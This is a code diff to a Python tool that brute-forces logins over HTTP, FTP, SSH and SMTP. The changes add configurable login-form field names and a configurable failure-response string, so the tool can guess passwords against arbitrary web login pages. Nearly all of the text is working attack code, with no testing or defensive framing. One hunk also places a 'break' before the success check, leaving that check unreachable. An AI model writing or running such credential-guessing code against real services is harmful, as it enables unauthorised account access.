@@ -22,6 +22,8 @@ parser.add_argument('-v', '--verbose', nargs='?', help="Enter show to see login 
 parser.add_argument('-s', '--service', type=str, help="Acceptable services are http, ftp, ssh and smtp")
 parser.add_argument('-r', '--response', type=str, help="Web response after login failed attempt")
 parser.add_argument('-o', '--port', type=int, help="SSH, FTP and SMTP ports")
+parser.add_argument('--username_form', type=str, help="Username form as shown on site sourcode")
+parser.add_argument('--password_form', type=str, help="Password form as shown on site sourcode")
 args = parser.parse_args()
 
 if len(sys.argv) < 2:
@@ -36,6 +38,8 @@ if args.service == "http":
     password = args.password
     password_file = args.password_file
     response = args.response
+    form1 = args.username_form
+    form2 = args.password_form
 
     if "://" not in target:
         print("Target must start with http:// or https://")
@@ -56,7 +60,7 @@ if args.service == "http":
                 print('[+]', user, '_', password)
             post = {'username': user, 'password': password, 'submit': "Submit"}
             re = requests.post(target, data=post)
-            if "Incorrect Login Information" in re.text:  # Change this according to the server respond when login attempt failed
+            if args.response in re.text:  # Change this according to the server respond when login attempt failed
                 pass
             else:
                 print("\n-----------------------------------------"
@@ -90,7 +94,7 @@ if args.service == "http":
                 post = {'username': user, 'password': pwd, 'submit': "Submit"}
                 re = requests.post(target, data=post)
                 break
-                if "Incorrect Login Information" in re.text:  # Change this according to the server respond when login attempt failed
+                if args.response in re.text:  # Change this according to the server respond when login attempt failed
                     pass
                 else:
                     print("\n------------------------------------------------"
@@ -121,9 +125,9 @@ if args.service == "http":
                     break
 
                 print('\033[1;37m''[+]', username, '_', pwd)
-            post = {'username': username, 'password': pwd, 'submit': "Submit"}
+            post = {f'{form1}': username, f'{form2}': pwd, 'submit': "Submit"}
             re = requests.post(target, data=post)
-            if "Incorrect Login Information" in re.text: # Change this according to the server respond when login attempt failed
+            if args.response in re.text: # Change this according to the server respond when login attempt failed
                 pass
             else:
                 print("\n\033[1;92m-----------------------------------------"
